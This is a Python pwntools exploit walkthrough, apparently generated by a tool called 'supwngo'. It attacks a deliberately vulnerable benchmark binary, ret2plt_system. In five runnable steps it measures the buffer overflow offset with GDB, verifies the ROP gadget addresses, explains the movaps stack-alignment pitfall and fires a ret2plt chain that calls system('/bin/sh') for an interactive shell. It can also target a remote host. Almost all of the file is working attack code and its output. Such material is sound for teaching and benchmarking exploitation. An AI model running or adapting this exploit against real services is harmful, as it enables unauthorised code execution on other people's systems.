#!/usr/bin/env python3
# ==========================================================================
#  ret2plt: calling system("/bin/sh") in ret2plt_system
# ==========================================================================
#
#  Target : /srv/share/dev/supwngo/.claude/worktrees/agent-a94bf3ef2466a61db/benchmark/corpus/02_ret2plt_system/ret2plt_system
#  Family : rop_chain
#  Route  : ret2plt / ret2system (no leak needed) (confidence 0.95)
#
# ------------------------------------------------------------------------
# HOW TO USE THIS FILE
# ------------------------------------------------------------------------
# Every step below is runnable on its own. Run them in order, read the
# EXPECT block, and check the result against VERIFY before moving on. If a
# step misbehaves, its TROUBLESHOOTING block maps the symptom you are
# seeing to the likely cause and the fix.
#
#    python3 ret2plt_system_walkthrough.py steps      # list the steps
#    python3 ret2plt_system_walkthrough.py 1          # run step 1 only
#    python3 ret2plt_system_walkthrough.py recon      # run a step by name
#    python3 ret2plt_system_walkthrough.py            # run the complete assembled exploit
#
# ------------------------------------------------------------------------
# THE STRATEGY
# ------------------------------------------------------------------------
# NX is enabled, so shellcode on the stack is not an option and we must
# reuse code that is already executable. We are lucky here: this binary
# already imports system() and already contains a "/bin/sh" string, so we
# do not need to leak anything at all. PIE is off, so every address in the
# binary is fixed and can be hardcoded. The whole exploit is therefore
# four stack qwords: an alignment `ret`, a `pop rdi; ret` to load the
# string address, the string address, and system@plt. The only measurement
# we actually need is the offset from the buffer to the saved return
# address.
#
# ------------------------------------------------------------------------
# MEASURED PROTECTIONS, AND WHAT EACH ONE FORCES
# ------------------------------------------------------------------------
# This is the reasoning behind the route above. The technique is not a
# preference; it is what these protections leave available.
#
#   NX (no-execute stack): enabled
#       The stack is mapped writable but not executable, so any shellcode
#       you write there will fault the moment the CPU tries to execute it.
#       -> Rules out: stack shellcode, ret2shellcode, jmp rsp
#       -> So: reuse code that is already executable in the process --
#       -> that is ROP: chain existing instruction sequences that end in
#       -> `ret`.
#
#   Stack canary: absent
#       Nothing sits between the buffer and the saved return address to
#       detect the overwrite, so a straight linear overflow reaches the
#       return address undetected.
#       -> So: a plain linear overflow is enough; no leak needed.
#
#   PIE: disabled
#       The binary loads at a fixed address (typically 0x400000), so every
#       address in it is the same on every run and can be hardcoded.
#       -> So: no leak is needed for anything inside the binary itself.
#
#   RELRO: Partial RELRO
#       The GOT is writable at runtime, so GOT entries can be overwritten
#       to redirect a library call.
#       -> So: a GOT overwrite is available if you need a write target.
#
# ------------------------------------------------------------------------
# DECISION TREE / FALLBACKS
# ------------------------------------------------------------------------
# If the primary route fails at some step, these are the alternatives and
# why they were or were not chosen. A route marked 'structural' can never
# work on this binary -- do not spend time on it.
#
#   PRIMARY: ret2plt / ret2system (no leak needed) [VIABLE, score 0.95]:
#   The binary imports system() -- so it has a system@plt entry -- and
#   already contains a "/bin/sh" string at 0x402008. Nothing has to be
#   leaked: load the string address into RDI with a pop gadget and call
#   system@plt. This is the shortest route available and it is fully
#   deterministic because PIE is off.
#
#   FALLBACK: guided triage (discover the missing facts, then re-evaluate)
#   [VIABLE, score 0.15]: Always available. Rather than assuming a
#   technique, this route establishes the facts a technique needs --
#   protections, symbols, gadget inventory, a reproducible crash, and the
#   offset -- and then tells you which family those facts unlock. Use it
#   when nothing else scored, or when you want to verify the groundwork
#   yourself.
#
#   RULED OUT: ret2shellcode (execute bytes on the stack) [ruled out
#   (structural), score 0]: NX is enabled, so the stack is not executable:
#   shellcode written into the buffer cannot be run, and there is no
#   `win()`-style function to jump to either. Code execution therefore has
#   to come from code that is already mapped and already executable --
#   that is code reuse, which is what every other route in this decision
#   tree does. Missing: NX disabled (executable stack); or a
#   win()/give_shell()-style function in the binary. Becomes viable if:
#   you find a writable+executable region (check `readelf -l` for an RWE
#   segment, or an mprotect() call the program makes on your behalf)
#
# ------------------------------------------------------------------------
# SUCCESS CRITERIA
# ------------------------------------------------------------------------
# The exploit prints 'Shell confirmed' -- it sends `echo PWNED_$((6*7))`
# and reads back `PWNED_42`, which only a real shell can produce -- and
# then drops you into an interactive prompt where `id` and `ls` work.
#
# Facts in this file were obtained via:
#   - pwntools/pyelftools via supwngo Binary.load(ret2plt_system)
#   - supwngo ProtectionAnalyzer (one analyze() call)
#   - supwngo GadgetFinder (pwntools ROP / ropper / ROPgadget)
#   - objdump prologue of vuln() for frame size
#   - GDB cyclic probe (batch mode, no corefile)
# ==========================================================================


"""Generated by `supwngo explain`. Depends only on pwntools."""

import hashlib
import os
import subprocess
import sys

from pwn import *

context.clear(arch="amd64", os="linux", log_level="info")
context.terminal = ["bash", "-c"]


# ------------------------------------------------------------------------
# FACTS ABOUT THIS BINARY
# ------------------------------------------------------------------------
# Each value records how it was obtained and how much to trust it.
# 'measured' means it was observed against this binary; 'derived' means it
# was computed from other facts; 'assumed' means it fits convention but
# was not confirmed here -- check those.

# The target. Every address below belongs to THIS build.
# measured - the path this walkthrough was generated against (rebuild with benchmark/build_all.sh if it is missing)
BINARY = '/srv/share/dev/supwngo/.claude/worktrees/agent-a94bf3ef2466a61db/benchmark/corpus/02_ret2plt_system/ret2plt_system'

# Checked in step 1. If it differs, you have a different build and the hardcoded addresses below are wrong -- regenerate.
# measured - sha256 of the binary at generation time via `sha256sum ret2plt_system`
BINARY_SHA256 = '04aa1ac95df691de820989f0961029e8e1096235026e7862ee92450f70b562f3'

# Word size; sets pwntools' packing width.
# measured - ELF header via `file ret2plt_system`
BITS = 64

# Set (with REMOTE_PORT) to attack a remote instance.
# assumed
REMOTE_HOST = ""

# Remote port; 0 means run the local binary.
# assumed
REMOTE_PORT = 0

# Bytes from the start of the overflowed buffer to the saved return address. Everything downstream depends on this.
# measured - GDB cyclic-pattern probe against this binary via `gdb -q -batch -ex 'run < pattern.bin' -ex 'x/1gx $rsp' ret2plt_system` (at the SIGSEGV, RSP held 0x6161617461616173; cyclic_find(0x6161617461616173) == 72)
OFFSET = 72

# `pop rdi; ret` gadget.
# measured - gadget search (pwntools ROP) via `ROPgadget --binary ret2plt_system --only 'pop|ret|syscall' | grep -F 'pop rdi'` (the bytes at this address disassemble to `pop rdi; ret`)
G_POP_RDI = 0x4011fa

# `ret` gadget.
# measured - gadget search (pwntools ROP) via `ROPgadget --binary ret2plt_system --only 'pop|ret|syscall' | grep -F 'ret'` (the bytes at this address disassemble to `ret`)
G_RET = 0x40101a

# system()'s PLT stub. Call this to call system().
# measured - PLT entry for system() read from the ELF via `objdump -d -j .plt.sec ret2plt_system | grep -A2 system` (calling this is exactly equivalent to calling system() -- the PLT stub jumps through the GOT to the real libc function)
SYSTEM_PLT = 0x4010c4

# Address of the "/bin/sh" string inside the binary.
# measured - byte search for "/bin/sh\x00" in the loaded image via `python3 -c "from pwn import *; e=ELF('ret2plt_system'); print(hex(next(e.search(b'/bin/sh\\x00'))))"` (this is the address OF THE STRING BYTES, which is what system() wants in RDI)
BINSH = 0x402008


# ------------------------------------------------------------------------
# Shared helpers
# ------------------------------------------------------------------------


def start(**kw):
    """Start the target: a local process, or the remote if one is set."""
    if REMOTE_HOST and REMOTE_PORT:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(BINARY, **kw)


def confirm_shell(io, timeout=5):
    """Prove we have a shell in a way a machine can check.

    `io.interactive()` is useless as a success signal under a pipe or a
    test harness: it returns immediately and the caller cannot tell a
    working exploit from a broken one. So we ask the shell to do
    arithmetic only a shell would do and look for the answer.
    """
    token = b"PWNED_42"
    try:
        io.sendline(b"echo PWNED_$((6*7))")
        io.recvuntil(token, timeout=timeout)
    except EOFError:
        log.failure("No shell: the process died before answering.")
        return False
    except Exception as exc:
        log.failure("No shell: %s" % exc)
        return False
    log.success("Shell confirmed (the process echoed %s)." % token.decode())
    return True


def require_tool(name, install_hint):
    """Check an external tool this walkthrough asks you to run exists."""
    from shutil import which

    if which(name):
        return True
    log.warning("%s not found. Install it with: %s", name, install_hint)
    return False


# ==========================================================================
#  STEP 1 of 5 - Confirm the binary and the gadget addresses
# ==========================================================================
#
# WHY THIS STEP:
#   Every address in this walkthrough is a property of one particular
#   compilation of this binary, and the benchmark binaries are rebuilt
#   from source rather than committed. If you hold a different build, the
#   addresses are wrong and the exploit will segfault for a reason that
#   looks like a bad technique choice. Thirty seconds here saves an hour
#   of misdiagnosis. This step also disassembles each claimed gadget
#   address to prove the instructions are really there.
#
# EXPECT TO SEE:
#   The two sha256 lines match, the protection lines agree with the table
#   in the header, and one green 'really is' line per gadget.
#
# HOW YOU KNOW IT WORKED:
#   The step returns True and prints no 'is NOT' line. If the sha256
#   differs but every gadget still verifies, you are probably fine; if a
#   gadget fails to verify, stop and regenerate.
#
# TROUBLESHOOTING (symptom -> cause -> fix):
#   If you see "Binary not found":
#     cause: the corpus binaries are gitignored and are built on demand
#     do:    run benchmark/build_all.sh from the repository root
#   If you see "sha256 differs and gadget addresses do not verify":
#     cause: a different compiler or flags produced a different layout
#     do:    regenerate this walkthrough against your build: `python3 -m
#     supwngo.cli explain <binary>`
#   If you see "disasm() raises or prints nothing":
#     cause: the address is outside a mapped section of the ELF, i.e. not
#     a real code address in this build
#     do:    re-find the gadget with the ROPgadget command shown in the
#     facts block and update the constant
#
# DO IT YOURSELF (the manual equivalent, worth running once):
#   # Confirm the protections yourself, independently of this script
#   $ checksec --file=ret2plt_system
#     expect: the same NX / PIE / canary / RELRO values as the header
#     table
#
#   # See the gadget bytes with your own eyes
#   $ objdump -d ret2plt_system | grep -A3 'vuln'
#     expect: an endbr64 before the gadget instruction -- which is exactly
#     why the gadget address is the symbol address plus 4
#
# WORTH KNOWING:
#   The endbr64 detail above is worth internalising: with CET enabled,
#   compilers put a 4-byte endbr64 landing pad at the start of every
#   address-taken function. A `pop rdi; ret` inside such a function
#   therefore begins 4 bytes past the symbol. Using the symbol address
#   usually does not crash -- it just does not do what you wanted, which
#   is far harder to debug than a crash.
#
def step_preflight():
    """Confirm the binary matches, and that the claimed gadgets really exist."""
    if not os.path.exists(BINARY):
        log.failure("Binary not found: %s", BINARY)
        log.info("Rebuild the corpus with: benchmark/build_all.sh")
        return False

    actual = hashlib.sha256(open(BINARY, "rb").read()).hexdigest()
    log.info("sha256 expected %s", BINARY_SHA256)
    log.info("sha256 actual   %s", actual)
    if actual != BINARY_SHA256:
        log.warning("DIFFERENT BUILD than this walkthrough was generated for.")
        log.warning("The hardcoded addresses below are probably wrong.")
        log.warning("Regenerate with: supwngo explain %s", BINARY)
    else:
        log.success("Binary matches the one this walkthrough was written for.")

    elf = ELF(BINARY, checksec=False)
    log.info("arch=%s bits=%d", elf.arch, elf.bits)
    for label, value in (
        ("NX", elf.nx), ("PIE", elf.pie), ("Canary", elf.canary),
        ("RELRO", elf.relro),
    ):
        log.info("  %-7s %s", label, value)

    # Verify each claimed gadget address really holds those instructions.
    # This is the check that catches a rebuilt binary AND the classic
    # symbol-vs-gadget address mistake in one shot.
    gadgets = [
        (G_RET, 'ret'),
        (G_POP_RDI, 'pop rdi; ret'),
    ]
    ok = True
    for address, expected in gadgets:
        found = disasm(elf.read(address, 16), vma=address)
        first = found.strip().splitlines()[0] if found.strip() else "<nothing>"
        head = expected.split(";")[0].strip()
        if head.split()[0] in first:
            log.success("%#x really is `%s`  (%s)", address, expected, first.strip())
        else:
            ok = False
            log.failure("%#x is NOT `%s` -- it disassembles to: %s",
                        address, expected, first.strip())
    if not ok:
        log.warning("At least one gadget address is stale. Regenerate, or "
                    "re-find the gadget by hand (see the command above).")
    return ok


# ==========================================================================
#  STEP 2 of 5 - Measure the offset to the saved return address
# ==========================================================================
#
# WHY THIS STEP:
#   vuln() overflows a stack buffer, but to control execution we need to
#   know exactly where the saved return address sits relative to the start
#   of that buffer. Guessing wastes time; a cyclic pattern measures it in
#   one run. Every later step is built on this number, so it is worth
#   establishing first and confirming. This walkthrough already measured
#   it as 72; run this step to confirm that independently.
#
# EXPECT TO SEE:
#   GDB reports `Program received signal SIGSEGV`, with RIP inside vuln at
#   its `ret`, and `x/1gx $rsp` showing a value made of pattern bytes such
#   as 0x6161617461616173 ('saaataaa'). cyclic_find then prints OFFSET =
#   72.
#
# HOW YOU KNOW IT WORKED:
#   The printed offset is a small positive multiple of 8, and it equals
#   72. If it is not a multiple of 8 on x86-64, something else is going on
#   -- the value you read was probably not the return address.
#
# TROUBLESHOOTING (symptom -> cause -> fix):
#   If you see "no SIGSEGV; the program exits normally":
#     cause: the pattern was shorter than the distance to the return
#     address, or input is read by a function that stops at a newline
#     before overflowing
#     do:    raise cyclic(400) to cyclic(1000); if it still will not
#     crash, check how the target reads input -- scanf("%s") and fgets()
#     stop at whitespace/newline, which a cyclic pattern does not contain,
#     so the read is not the problem, the length is
#   If you see "cyclic_find returns -1":
#     cause: the 8 bytes at RSP are not from the pattern -- you are
#     probably looking at a frame that was not overwritten, or the crash
#     is not a return-address overwrite at all
#     do:    run GDB interactively, break on the vulnerable function's
#     `ret`, and inspect the stack around RSP to see where the pattern
#     actually landed
#   If you see "GDB prints `During startup program exited`":
#     cause: the binary is not executable, or the loader failed
#     do:    chmod +x the binary and confirm `file` reports a valid ELF
#
# DO IT YOURSELF (the manual equivalent, worth running once):
#   # Do the whole thing by hand -- this is the workflow to learn
#   $ python3 -c "from pwn import *; open('/tmp/pat','wb').write(cyclic(400))"
#   $ gdb -q ret2plt_system
#   $ (gdb) run < /tmp/pat
#   $ (gdb) x/1gx $rsp        # the overwritten return address
#   $ (gdb) info registers rip rsp
#   $ python3 -c "from pwn import *; print(cyclic_find(p64(0x6161617461616173)[:4]))"
#     expect: SIGSEGV, then the pattern value at RSP, then the offset
#
#   # The pwntools corefile route (shorter, but environment dependent --
#   # know both)
#   $ ulimit -c unlimited
#   $ cat /proc/sys/kernel/core_pattern   # must NOT be a |pipe
#   $ sudo sysctl -w kernel.core_pattern=core   # if it is
#   $ python3 -c "from pwn import *; p=process('ret2plt_system'); p.sendline(cyclic(400)); p.wait(); print(cyclic_find(p.corefile.read(p.corefile.rsp,4)))"
#     expect: the same offset. Note this writes a core.<pid> file into the
#     current directory, which is why the step above uses GDB.
#
# WORTH KNOWING:
#   Why 8 bytes and why RSP: on x86-64 the `ret` instruction pops the
#   return address off the stack into RIP. When that popped value is non-
#   canonical garbage, the fault is reported at the `ret` itself and RSP
#   still points at the slot -- so `x/1gx $rsp` reads exactly the 8 bytes
#   that were about to become RIP.
#
def step_offset():
    """Find the buffer-to-return-address offset with a cyclic pattern."""
    if not require_tool("gdb", "sudo apt install gdb"):
        return False

    # A cyclic (de Bruijn) pattern has the property that any 4 consecutive
    # bytes appear exactly once in it (4 because that is pwntools' default
    # subsequence length, n=4), so whatever lands in the return address
    # tells us its distance from the start of the buffer.
    pattern = cyclic(400)
    with open("/tmp/supwngo_pattern.bin", "wb") as handle:
        handle.write(pattern)

    script = [
        "set confirm off",
        "run < /tmp/supwngo_pattern.bin",
        # At the SIGSEGV the faulting instruction is the `ret` itself, so
        # RSP still points at the saved return address we overwrote.
        "x/1gx $rsp",
        "info registers rip rsp",
    ]
    argv = ["gdb", "-q", "-batch"]
    for line in script:
        argv += ["-ex", line]
    argv.append(BINARY)

    completed = subprocess.run(argv, capture_output=True, text=True, timeout=60)
    output = completed.stdout + completed.stderr
    print(output)

    if "SIGSEGV" not in output:
        log.failure("No SIGSEGV: the pattern did not reach the return address.")
        return False

    import re as _re
    matches = _re.findall(r":\s*0x([0-9a-f]{16})\b", output)
    if not matches:
        log.failure("Could not read a value off RSP; see the GDB output above.")
        return False

    faulted = int(matches[-1], 16)
    log.info("RSP at the fault held %#x", faulted)
    # Only the FIRST FOUR bytes are looked up. The pattern's unique
    # subsequences are 4 bytes long, so passing all 8 makes pwntools warn
    # and truncate anyway -- do it explicitly so the intent is visible.
    found = cyclic_find(p64(faulted)[:4])
    if found < 0:
        log.failure("%#x is not part of our pattern -- see TROUBLESHOOTING.", faulted)
        return False

    log.success("OFFSET = %d", found)
    log.info("That is: cyclic_find(p64(%#x)[:4]) == %d", faulted, found)
    if found != OFFSET:
        log.warning("Measured %d but this file has OFFSET = %d. Trust the "
                    "measurement and update OFFSET.", found, OFFSET)
    else:
        log.success("Matches the OFFSET constant (72) in this file.")
    return found


# ==========================================================================
#  STEP 3 of 5 - Locate system@plt and the "/bin/sh" string
# ==========================================================================
#
# WHY THIS STEP:
#   These are the two addresses the exploit calls and passes. Both are
#   fixed because PIE is off, so they can be hardcoded -- but one of them
#   has a trap. system() expects RDI to hold the address of the string
#   BYTES. A C source file that writes `const char *cmd = "/bin/sh";`
#   produces a symbol holding a POINTER to those bytes, at a different
#   address, and that symbol is usually the more inviting-looking thing in
#   the symbol table. Pass the pointer's address and system() dereferences
#   the wrong thing and fails. This step proves which address holds the
#   actual text.
#
# EXPECT TO SEE:
#   system@plt printed as 0x4010c4, the string found at 0x402008 with its
#   bytes shown as b'/bin/sh\x00', and a warning naming any symbol that
#   merely points at it.
#
# HOW YOU KNOW IT WORKED:
#   All three asserts pass, and the bytes read back from BINSH are
#   literally b'/bin/sh\x00'. If you see the pointer warning, note the two
#   addresses are different -- that is the point.
#
# TROUBLESHOOTING (symptom -> cause -> fix):
#   If you see "AssertionError on the BINSH line":
#     cause: a different build placed the string elsewhere
#     do:    use the address the search actually printed, or regenerate
#     this walkthrough
#   If you see "KeyError: 'system' on elf.plt":
#     cause: this binary does not import system(), so this whole route
#     does not apply to it
#     do:    switch to the ret2libc route in the decision tree at the top
#     of this file: leak a libc address and call system there
#
# DO IT YOURSELF (the manual equivalent, worth running once):
#   # Find the string yourself
#   $ strings -t x ret2plt_system | grep 'bin/sh'
#     expect: a file offset and the text; note this is a FILE offset, so
#     for a no-PIE binary add the load base (0x400000) only if the section
#     mapping requires it -- ELF.search() avoids that arithmetic entirely,
#     which is why the code above uses it
#
#   # See the PLT stubs
#   $ objdump -d -j .plt.sec ret2plt_system
#     expect: one stub per imported function, including system
#
# WORTH KNOWING:
#   Why system@plt and not system's real libc address: the PLT stub is at
#   a fixed address in this binary, whereas system() itself lives at an
#   ASLR'd address inside libc. Calling the stub lets the dynamic linker
#   do the work of finding the real function -- so we get to call libc
#   without ever knowing where libc is.
#
def step_targets():
    """Confirm the two addresses this exploit depends on."""
    elf = ELF(BINARY, checksec=False)

    log.info("system@plt = %#x (from the ELF's PLT)", elf.plt["system"])
    assert elf.plt["system"] == SYSTEM_PLT, "SYSTEM_PLT constant is stale"

    # Find the STRING BYTES, not a pointer to them. This distinction is the
    # single most common way this exploit is written wrong.
    hits = list(elf.search(b"/bin/sh\x00"))
    log.info("\"/bin/sh\" string bytes found at: %s", [hex(h) for h in hits])
    assert BINSH in hits, "BINSH constant is not where the string actually is"
    log.success("BINSH = %#x holds the bytes %r", BINSH, elf.read(BINSH, 8))

    # Show the trap concretely: any `const char *` symbol pointing at the
    # string lives somewhere else and holds a POINTER, not the text.
    # Restrict the scan to data sections -- a symbol in .text is code, and
    # some symbols are not addresses at all, so reading them blindly just
    # makes pwntools log errors that look like a problem and are not.
    regions = []
    for section_name in (".data", ".data.rel.ro", ".bss", ".rodata"):
        section = elf.get_section_by_name(section_name)
        if section is not None:
            start_addr = section.header.sh_addr
            regions.append((start_addr, start_addr + section.header.sh_size))

    for sym, addr in sorted(elf.symbols.items()):
        if not any(lo <= addr <= hi - 8 for lo, hi in regions):
            continue
        try:
            value = u64(elf.read(addr, 8))
        except Exception:
            continue
        if value in hits:
            log.warning("Symbol %r at %#x is a POINTER to the string "
                        "(it contains %#x).", sym, addr, value)
            log.warning("Passing %#x in RDI would give system() a pointer-to-"
                        "pointer and fail. Use %#x.", addr, BINSH)
    return True


# ==========================================================================
#  STEP 4 of 5 - Understand the 16-byte stack alignment fix (the `movaps` trap)
# ==========================================================================
#
# WHY THIS STEP:
#   This is the single most common reason a correct-looking ret2libc chain
#   segfaults inside libc rather than giving a shell, and it wastes an
#   enormous amount of people's time. glibc's system() reaches
#   do_system(), which uses SSE instructions such as `movaps [rsp+0x50],
#   xmm0`. `movaps` faults unless its memory operand is 16-byte aligned.
#   The x86-64 ABI guarantees RSP is 16-byte aligned at every function
#   entry -- but our ROP chain reaches system@plt via `ret`, not `call`,
#   and each entry we pop shifts RSP by 8. So we can easily arrive with
#   RSP 8 off. Inserting one extra bare `ret` before the call pops 8 more
#   bytes and restores alignment. It is a one-qword fix for a crash that
#   looks like something far more serious.
#
# CARRIED IN FROM EARLIER STEPS:
#   OFFSET = 72  (a constant above)
#
# EXPECT TO SEE:
#   Attempt 1 (no alignment ret) prints 'No shell' and usually dies with
#   SIGSEGV inside libc. Attempt 2 prints 'Shell confirmed'. The summary
#   lines then contrast the two.
#
# HOW YOU KNOW IT WORKED:
#   Attempt 2 confirms a shell. If attempt 1 also works, your glibc
#   happened to be aligned already -- that is fine and the `ret` is
#   harmless, so keep it.
#
# TROUBLESHOOTING (symptom -> cause -> fix):
#   If you see "both attempts fail":
#     cause: the problem is not alignment -- most likely the offset or one
#     of the addresses is wrong
#     do:    re-run step 2 (offset) and step 3 (addresses) before
#     returning here; alignment only matters once the chain is otherwise
#     correct
#   If you see "attempt 1 works and attempt 2 does not":
#     cause: very unusual; it would mean the extra ret broke an alignment
#     that was already right
#     do:    drop G_RET from the chain in the final exploit and keep the
#     three-entry version
#
# DO IT YOURSELF (the manual equivalent, worth running once):
#   # Watch the movaps fault yourself -- worth doing once, because then
#   # you will recognise it forever
#   $ gdb -q ret2plt_system
#   $ (gdb) run < /tmp/unaligned_payload.bin
#   $ (gdb) x/i $rip        # expect a movaps ... xmm instruction
#   $ (gdb) p $rsp % 16     # expect 8, not 0
#     expect: RIP sitting on a movaps instruction inside do_system, with
#     RSP % 16 == 8 -- the 8-byte misalignment, made visible
#
# WORTH KNOWING:
#   Rule of thumb worth carrying: if a ROP chain crashes INSIDE a libc
#   function rather than at your gadget addresses, suspect alignment
#   first. Add one `ret` and retry before debugging anything else.
#
def step_alignment():
    """Demonstrate why a bare `ret` goes first in the chain."""
    log.info("G_RET = %#x is a single `ret` instruction.", G_RET)
    log.info("It does nothing except pop 8 bytes off the stack -- which is")
    log.info("precisely the point: it shifts RSP by 8 to restore 16-byte")
    log.info("alignment before we enter libc.")

    # Try it WITHOUT the alignment ret first, so you see the failure mode.
    log.info("--- attempt 1: no alignment ret (expected to fail) ---")
    io = start()
    io.recvuntil(b"Input: ", timeout=3)
    io.send(flat({OFFSET: [G_POP_RDI, BINSH, SYSTEM_PLT]}))
    unaligned_ok = confirm_shell(io, timeout=2)
    io.close()

    log.info("--- attempt 2: with the alignment ret (expected to work) ---")
    io = start()
    io.recvuntil(b"Input: ", timeout=3)
    io.send(flat({OFFSET: [G_RET, G_POP_RDI, BINSH, SYSTEM_PLT]}))
    aligned_ok = confirm_shell(io, timeout=2)
    io.close()

    log.info("without alignment ret: %s", "shell" if unaligned_ok else "no shell")
    log.info("with alignment ret:    %s", "shell" if aligned_ok else "no shell")
    if aligned_ok and not unaligned_ok:
        log.success("This is the movaps alignment issue, demonstrated.")
    elif aligned_ok and unaligned_ok:
        log.info("Both worked on this glibc -- alignment was already correct. "
                 "Keep the ret anyway: it is free and makes the chain robust.")
    return aligned_ok


# ==========================================================================
#  STEP 5 of 5 - Assemble the chain and get the shell
# ==========================================================================
#
# WHY THIS STEP:
#   Everything measured and confirmed above now goes into one payload.
#   Read the stack layout it prints: that mapping from stack slot to value
#   is the whole of ROP. Each qword is either an address the `ret` chain
#   jumps to, or data a `pop` consumes.
#
# CARRIED IN FROM EARLIER STEPS:
#   OFFSET = 72  (a constant above)
#
# EXPECT TO SEE:
#   A hexdump of the payload, the stack layout table, then 'Shell
#   confirmed (the process echoed PWNED_42)' and an interactive prompt.
#
# HOW YOU KNOW IT WORKED:
#   `confirm_shell` succeeds. At the interactive prompt, `id` prints your
#   user and `ls` lists the directory -- that is a real shell, not echoed
#   output.
#
# TROUBLESHOOTING (symptom -> cause -> fix):
#   If you see "EOFError immediately after send":
#     cause: the process crashed rather than reaching system()
#     do:    re-run steps 2 and 3; if both pass, run step 4 to isolate
#     alignment
#   If you see "the target's normal output appears and the process exits
#   0":
#     cause: the padding never reached the return address, so execution
#     returned normally
#     do:    the offset is wrong: re-run step 2 and use its value
#   If you see "a shell appears but `confirm_shell` reports failure":
#     cause: the shell is there but did not flush; some shells need a
#     moment
#     do:    raise the timeout in confirm_shell, or just call
#     io.interactive() and type `id` yourself
#
def step_fire():
    """Build the chain qword by qword and fire it."""
    chain = flat([
        G_RET,        # 1. align the stack (step 4)
        G_POP_RDI,    # 2. pop the next qword into RDI
        BINSH,        # 3.   ... that qword: the "/bin/sh" address
        SYSTEM_PLT,   # 4. now call system(), whose arg is already in RDI
    ])
    payload = flat({OFFSET: chain})

    log.info("Stack layout being written:")
    log.info("  [0 .. %d)      padding", OFFSET)
    log.info("  [%d]           %#x  ret (alignment)", OFFSET, G_RET)
    log.info("  [%d]           %#x  pop rdi; ret", OFFSET + 8, G_POP_RDI)
    log.info("  [%d]           %#x  -> RDI (\"/bin/sh\")", OFFSET + 16, BINSH)
    log.info("  [%d]           %#x  system@plt", OFFSET + 24, SYSTEM_PLT)
    log.info("%s", hexdump(payload))

    io = start()
    io.recvuntil(b"Input: ", timeout=3)
    io.send(payload)
    ok = confirm_shell(io)
    if ok:
        log.success("We have a shell. Try: id; ls; cat flag.txt")
        io.interactive()
    io.close()
    return ok


# ==========================================================================
#  THE COMPLETE EXPLOIT
# ==========================================================================
#
# Everything above, assembled into one run. This is the end product of the
# steps -- not a separate approach.
#

def exploit():
    """The complete ret2plt exploit: padding, alignment, RDI, system@plt."""
    io = start()
    io.recvuntil(b"Input: ", timeout=3)

    chain = flat([
        G_RET,        # alignment fixer: see step 4
        G_POP_RDI,    # pop the next stack qword into RDI
        BINSH,        # -> RDI = address of "/bin/sh"
        SYSTEM_PLT,   # call system("/bin/sh")
    ])
    payload = flat({OFFSET: chain})

    log.info("offset=%d  chain=%d bytes  total=%d bytes",
             OFFSET, len(chain), len(payload))
    io.send(payload)

    if not confirm_shell(io):
        log.failure("No shell. Work back through the steps above: "
                    "step 2 (offset), step 1 (addresses), step 4 (alignment).")
        io.close()
        return False

    log.success("Shell obtained on ret2plt_system.")
    io.interactive()
    return True


# ------------------------------------------------------------------------
# Step dispatch: run one step, list them, or run the whole exploit.
# ------------------------------------------------------------------------

STEPS = [
    (1, "preflight", step_preflight, 'Confirm the binary and the gadget addresses'),
    (2, "offset", step_offset, 'Measure the offset to the saved return address'),
    (3, "targets", step_targets, 'Locate system@plt and the "/bin/sh" string'),
    (4, "alignment", step_alignment, 'Understand the 16-byte stack alignment fix (the `movaps` trap)'),
    (5, "fire", step_fire, 'Assemble the chain and get the shell')
]


def list_steps():
    print("Steps in this walkthrough:")
    for number, slug, _fn, title in STEPS:
        print("  %d  %-22s %s" % (number, slug, title))
    print("")
    print("Run one with:  python3 %s <number|name>" % os.path.basename(__file__))
    print("Run the full exploit with:  python3 %s" % os.path.basename(__file__))


def main(argv):
    if not argv:
        return 0 if exploit() else 1
    selector = argv[0]
    if selector in ("steps", "list", "-l", "--list", "-h", "--help"):
        list_steps()
        return 0
    for number, slug, fn, title in STEPS:
        if selector == slug or selector == str(number):
            log.info("STEP %d - %s", number, title)
            result = fn()
            return 0 if result is not False else 1
    log.error("No such step: %s (try `steps` to list them)", selector)
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
